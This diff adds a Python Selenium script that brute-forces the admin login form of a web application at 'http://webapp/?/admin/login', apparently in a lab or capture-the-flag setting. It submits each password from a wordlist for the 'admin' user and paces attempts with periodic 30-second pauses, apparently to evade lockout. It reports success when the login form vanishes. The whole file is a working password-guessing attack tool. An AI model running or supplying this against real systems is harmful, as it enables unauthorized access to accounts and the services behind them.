@@ -1,0 +1,51 @@
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+import os
+
+os.environ["DISPLAY"] = ":10"
+
+driver = webdriver.Firefox()
+
+target_url = "http://webapp/?/admin/login"
+
+driver.get(target_url)
+
+# get passwords
+with open('./newlist.txt', 'r') as f:
+    passwords = f.readlines()
+
+cnt = 0
+#driver.add_cookie({"name":"experimentation_subject_id","domain":"webapp","value":"IjMyYTYzODgyLWY1ZGItNDliZS04ZGUwLTQ5YWJlZWU4YjVhNyI=--e9948fb549d93a8a6ded5fa10a0adc8c55b475ee"})
+#print(driver.get_cookies())
+#try:
+for line in passwords:
+    print(f"Trying {line}")
+    userfield = driver.find_element_by_name('login[username]')
+    userfield.send_keys("admin")
+    passfield = driver.find_element_by_name('login[password]')
+    passfield.send_keys(line)
+
+    driver.find_element_by_id('submit').click()
+    if cnt % 3 == 0:
+        print("long sleep...")
+        time.sleep(30)
+    else:
+        time.sleep(1)
+    #if driver.current_url() is not target_url:
+    #   print("diff url!")
+    cnt += 1
+    try:
+        print("testcheck")
+        driver.find_element_by_id('submit')
+    except:
+        print("password found: " + line)
+        print("Exiting...")
+        time.sleep(10)
+        driver.quit()
+#except:
+#    print("ded")
+
+print("Exiting...")
+time.sleep(10)
+driver.quit()
